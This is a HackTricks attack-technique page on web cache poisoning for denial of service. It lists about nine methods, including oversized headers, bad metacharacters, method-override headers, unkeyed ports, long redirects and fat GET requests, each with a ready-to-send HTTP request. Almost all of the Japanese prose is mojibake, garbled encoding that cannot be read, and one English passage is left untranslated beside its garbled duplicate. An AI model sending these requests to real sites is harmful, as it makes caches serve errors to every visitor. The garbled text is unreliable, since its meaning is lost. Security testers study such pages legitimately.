# Cache Poisoning to DoS

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

{% hint style="danger" %}
ã“ã®ãƒšãƒ¼ã‚¸ã§ã¯ã€**ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã‚µãƒ¼ãƒãƒ¼ã«å¯¾ã—ã¦æœ‰åŠ¹ãªãƒªã‚¯ã‚¨ã‚¹ãƒˆ**ã«å¯¾ã—ã¦**ã‚¦ã‚§ãƒ–ã‚µãƒ¼ãƒãƒ¼ãŒã‚¨ãƒ©ãƒ¼ã§å¿œç­”ã™ã‚‹**ã‚ˆã†ã«è©¦ã¿ã‚‹ã•ã¾ã–ã¾ãªãƒãƒªã‚¨ãƒ¼ã‚·ãƒ§ãƒ³ã‚’è¦‹ã¤ã‘ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
{% endhint %}

* **HTTP Header Oversize (HHO)**

ã‚¦ã‚§ãƒ–ã‚µãƒ¼ãƒãƒ¼ãŒã‚µãƒãƒ¼ãƒˆã™ã‚‹ã‚µã‚¤ã‚ºã‚ˆã‚Šå¤§ããã€ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã‚µãƒ¼ãƒãƒ¼ãŒã‚µãƒãƒ¼ãƒˆã™ã‚‹ã‚µã‚¤ã‚ºã‚ˆã‚Šå°ã•ã„ãƒ˜ãƒƒãƒ€ãƒ¼ã‚µã‚¤ã‚ºã§ãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’é€ä¿¡ã—ã¾ã™ã€‚ã‚¦ã‚§ãƒ–ã‚µãƒ¼ãƒãƒ¼ã¯400ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã§å¿œç­”ã—ã€ã“ã‚ŒãŒã‚­ãƒ£ãƒƒã‚·ãƒ¥ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™:
```
GET / HTTP/1.1
Host: redacted.com
X-Oversize-Hedear:Big-Value-000000000000000
```
* **HTTPãƒ¡ã‚¿ã‚­ãƒ£ãƒ©ã‚¯ã‚¿ãƒ¼ (HMC) ã¨äºˆæœŸã—ãªã„å€¤**

**æœ‰å®³ãªãƒ¡ã‚¿ã‚­ãƒ£ãƒ©ã‚¯ã‚¿ãƒ¼**ã‚’å«ã‚€ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’é€ä¿¡ã—ã¾ã™ã€‚æ”»æ’ƒãŒæ©Ÿèƒ½ã™ã‚‹ãŸã‚ã«ã¯ã€ã¾ãšã‚­ãƒ£ãƒƒã‚·ãƒ¥ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚
```
GET / HTTP/1.1
Host: redacted.com
X-Meta-Hedear:Bad Chars\n \r
```
A badly configured header could be just `\:` as a header.

This could also work if unexpected values are sent, like an unexpected Content-Type:  
æ‚ªãæ§‹æˆã•ã‚ŒãŸãƒ˜ãƒƒãƒ€ãƒ¼ã¯ã€å˜ã« `\:` ã¨ã—ã¦ãƒ˜ãƒƒãƒ€ãƒ¼ã«ãªã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

äºˆæœŸã—ãªã„å€¤ãŒé€ä¿¡ã•ã‚Œã‚‹å ´åˆã€ä¾‹ãˆã°äºˆæœŸã—ãªã„ Content-Type: ã®å ´åˆã‚‚ã€ã“ã‚ŒãŒæ©Ÿèƒ½ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚
```
GET /anas/repos HTTP/2
Host: redacted.com
Content-Type: HelloWorld
```
* **Unkeyed header**

ä¸€éƒ¨ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã¯ã€_X-Amz-Website-Location-Redirect: someThing_ ãƒ˜ãƒƒãƒ€ãƒ¼ã®ã‚ˆã†ã«ã€ãƒªã‚¯ã‚¨ã‚¹ãƒˆå†…ã®ç‰¹å®šã®ãƒ˜ãƒƒãƒ€ãƒ¼ã‚’**è¦‹ã‚‹ã¨**ã‚¨ãƒ©ãƒ¼ã‚¹ãƒ†ãƒ¼ã‚¿ã‚¹ã‚³ãƒ¼ãƒ‰ã‚’è¿”ã—ã¾ã™ã€‚
```
GET /app.js HTTP/2
Host: redacted.com
X-Amz-Website-Location-Redirect: someThing

HTTP/2 403 Forbidden
Cache: hit

Invalid Header
```
* **HTTPãƒ¡ã‚½ãƒƒãƒ‰ã‚ªãƒ¼ãƒãƒ¼ãƒ©ã‚¤ãƒ‰æ”»æ’ƒ (HMO)**

ã‚µãƒ¼ãƒãƒ¼ãŒ `X-HTTP-Method-Override`ã€`X-HTTP-Method`ã€ã¾ãŸã¯ `X-Method-Override` ã®ã‚ˆã†ãªãƒ˜ãƒƒãƒ€ãƒ¼ã§HTTPãƒ¡ã‚½ãƒƒãƒ‰ã‚’å¤‰æ›´ã™ã‚‹ã“ã¨ã‚’ã‚µãƒãƒ¼ãƒˆã—ã¦ã„ã‚‹å ´åˆã€ãƒ¡ã‚½ãƒƒãƒ‰ã‚’å¤‰æ›´ã—ã¦æœ‰åŠ¹ãªãƒšãƒ¼ã‚¸ã‚’ãƒªã‚¯ã‚¨ã‚¹ãƒˆã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€ã‚µãƒ¼ãƒãƒ¼ãŒãã‚Œã‚’ã‚µãƒãƒ¼ãƒˆã—ãªã„ãŸã‚ã€ä¸æ­£ãªãƒ¬ã‚¹ãƒãƒ³ã‚¹ãŒã‚­ãƒ£ãƒƒã‚·ãƒ¥ã•ã‚Œã¾ã™ï¼š
```
GET /blogs HTTP/1.1
Host: redacted.com
HTTP-Method-Override: POST
```
* **æœªéµãƒãƒ¼ãƒˆ**

Hostãƒ˜ãƒƒãƒ€ãƒ¼ã®ãƒãƒ¼ãƒˆãŒãƒ¬ã‚¹ãƒãƒ³ã‚¹ã«åæ˜ ã•ã‚Œã€ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã‚­ãƒ¼ã«å«ã¾ã‚Œã¦ã„ãªã„å ´åˆã€æœªä½¿ç”¨ã®ãƒãƒ¼ãƒˆã«ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ï¼š
```
GET /index.html HTTP/1.1
Host: redacted.com:1

HTTP/1.1 301 Moved Permanently
Location: https://redacted.com:1/en/index.html
Cache: miss
```
* **ãƒ­ãƒ³ã‚°ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆDoS**

ä»¥ä¸‹ã®ä¾‹ã®ã‚ˆã†ã«ã€xã¯ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã•ã‚Œã¦ã„ãªã„ãŸã‚ã€æ”»æ’ƒè€…ã¯ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆå¿œç­”ã®å‹•ä½œã‚’æ‚ªç”¨ã—ã¦ã€ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆãŒéå¸¸ã«å¤§ããªURLã‚’é€ä¿¡ã™ã‚‹ã‚ˆã†ã«ã—ã€ã‚¨ãƒ©ãƒ¼ã‚’è¿”ã™ã“ã¨ãŒã§ãã¾ã™ã€‚ãã®å¾Œã€ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã•ã‚Œã¦ã„ãªã„xã‚­ãƒ¼ãªã—ã§URLã«ã‚¢ã‚¯ã‚»ã‚¹ã—ã‚ˆã†ã¨ã™ã‚‹äººã€…ã¯ã€ã‚¨ãƒ©ãƒ¼å¿œç­”ã‚’å—ã‘å–ã‚Šã¾ã™:
```
GET /login?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 301 Moved Permanently
Location: /login/?x=veryLongUrl
Cache: hit

GET /login/?x=veryLongUrl HTTP/1.1
Host: www.cloudflare.com

HTTP/1.1 414 Request-URI Too Large
CF-Cache-Status: miss
```
* **ãƒ›ã‚¹ãƒˆãƒ˜ãƒƒãƒ€ãƒ¼ã®ã‚±ãƒ¼ã‚¹æ­£è¦åŒ–**

ãƒ›ã‚¹ãƒˆãƒ˜ãƒƒãƒ€ãƒ¼ã¯å¤§æ–‡å­—ã¨å°æ–‡å­—ã‚’åŒºåˆ¥ã—ãªã„ã¯ãšã§ã™ãŒã€ä¸€éƒ¨ã®ã‚¦ã‚§ãƒ–ã‚µã‚¤ãƒˆã¯å°æ–‡å­—ã§ã‚ã‚‹ã“ã¨ã‚’æœŸå¾…ã—ã¦ãŠã‚Šã€ãã†ã§ãªã„å ´åˆã¯ã‚¨ãƒ©ãƒ¼ã‚’è¿”ã—ã¾ã™:
```
GET /img.png HTTP/1.1
Host: Cdn.redacted.com

HTTP/1.1 404 Not Found
Cache:miss

Not Found
```
* **ãƒ‘ã‚¹ã®æ­£è¦åŒ–**

ä¸€éƒ¨ã®ãƒšãƒ¼ã‚¸ã¯ã€ãƒ‘ã‚¹ã«ãƒ‡ãƒ¼ã‚¿ã‚’URLã‚¨ãƒ³ã‚³ãƒ¼ãƒ‰ã—ã¦é€ä¿¡ã™ã‚‹ã¨ã‚¨ãƒ©ãƒ¼ã‚³ãƒ¼ãƒ‰ã‚’è¿”ã—ã¾ã™ãŒã€ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã‚µãƒ¼ãƒãƒ¼ã¯ãƒ‘ã‚¹ã‚’URLãƒ‡ã‚³ãƒ¼ãƒ‰ã—ã€URLãƒ‡ã‚³ãƒ¼ãƒ‰ã•ã‚ŒãŸãƒ‘ã‚¹ã®ãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’ä¿å­˜ã—ã¾ã™ã€‚
```
GET /api/v1%2e1/user HTTP/1.1
Host: redacted.com


HTTP/1.1 404 Not Found
Cach:miss

Not Found
```
* **Fat Get**

ä¸€éƒ¨ã®ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã‚µãƒ¼ãƒãƒ¼ï¼ˆCloudflareãªã©ï¼‰ã‚„ã‚¦ã‚§ãƒ–ã‚µãƒ¼ãƒãƒ¼ã¯ã€ãƒœãƒ‡ã‚£ã‚’æŒã¤GETãƒªã‚¯ã‚¨ã‚¹ãƒˆã‚’åœæ­¢ã™ã‚‹ãŸã‚ã€ç„¡åŠ¹ãªãƒ¬ã‚¹ãƒãƒ³ã‚¹ã‚’ã‚­ãƒ£ãƒƒã‚·ãƒ¥ã™ã‚‹ãŸã‚ã«æ‚ªç”¨ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ï¼š
```
GET /index.html HTTP/2
Host: redacted.com
Content-Length: 3

xyz


HTTP/2 403 Forbidden
Cache: hit
```
## å‚è€ƒæ–‡çŒ®

* [https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52](https://anasbetis023.medium.com/dont-trust-the-cache-exposing-web-cache-poisoning-and-deception-vulnerabilities-3a829f221f52)
* [https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------](https://youst.in/posts/cache-poisoning-at-scale/?source=post\_page-----3a829f221f52--------------------------------)

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€å®Ÿè·µã™ã‚‹ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®githubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
